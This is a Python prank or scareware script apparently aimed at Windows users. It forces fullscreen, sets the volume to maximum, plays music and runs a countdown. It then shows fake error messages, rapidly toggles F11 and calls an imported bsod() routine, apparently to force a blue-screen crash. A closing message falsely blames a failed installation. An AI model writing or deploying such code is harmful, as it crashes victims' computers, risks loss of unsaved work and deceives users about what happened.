import subprocess
import os
from random import randint
from time import sleep
import sys
from threading import Thread
from volume import change_volume
from music import play_music
from countdown import countdown
import keyboard
from bsod import bsod
# import pynput

def emergency_exit():
    while True:
        if keyboard.is_pressed('ENTER'):
            os._exit(0)

exitThread = Thread(target = emergency_exit)
exitThread.start()


keyboard.press('f11')


volume = True
def changeVolume(arg):
    # while volume == True:
    #     change_volume(100)
    #     sleep(0.5)
    change_volume(100)


volumeThread = Thread(target = changeVolume, args = (10, ))
volumeThread.start()


def musicThreading(arg):
    play_music()

musicThread = Thread(target = musicThreading, args = (10, ))
musicThread.start()


sleep(0.1)


def timerThreading():
    countdown(20)

countdownThread = Thread(target = countdown, args = (10, ))
countdownThread.start()


sleep(10)


print("Goodbye :)")

sleep(0.5)


#bsod section \/
if sys.platform == "win32":
    os.chdir(os.path.dirname(__file__))

    volume = False

    # pip_file_path = str(f"{os.path.dirname(__file__)}/bat/pip.bat")
    # subprocess.call([pip_file_path])

    try:
        range_repeat = randint(1, 3)
        for i in range(range_repeat):
            print("ERROR CANT FIND CURRENT WORKING DIRECTORY")
            keyboard.press_and_release("F11")
            keyboard.press_and_release("F11")
            keyboard.press_and_release("F11")
            keyboard.press_and_release("F11")
            keyboard.press_and_release("F11")
            sleep(0.01)
            keyboard.press_and_release("F11")
            keyboard.press_and_release("F11")
            keyboard.press_and_release("F11")
            keyboard.press_and_release("F11")


        # bat_file_path = str(f"{os.path.dirname(__file__)}/bsod.bat")
        # subprocess.call([bat_file_path])
        bsod()
        # pycache_path = str(f"{os.path.dirname(__file__)}/__pycache__/volume.cpython-310.pyc")
        # os.remove(pycache_path)


    except:
        input("Sorry something went wrong in the installation process. Please turn on internet and try again.")

else:
    input("Sorry, this program is only compatible with Windows.")


# volume = False


# range_repeat = randint(1, 3)
# for i in range(range_repeat):
#     print("ERROR CANT FIND CURRENT WORKING DIRECTORY")
#     keyboard.press_and_release("F11")
#     keyboard.press_and_release("F11")
#     keyboard.press_and_release("F11")
#     keyboard.press_and_release("F11")
#     keyboard.press_and_release("F11")
#     sleep(0.01)
#     keyboard.press_and_release("F11")
#     keyboard.press_and_release("F11")
#     keyboard.press_and_release("F11")
#     keyboard.press_and_release("F11")


# # bat_file_path = str(f"{os.path.dirname(__file__)}/bsod.bat")
# # subprocess.call([bat_file_path])
# bsod()
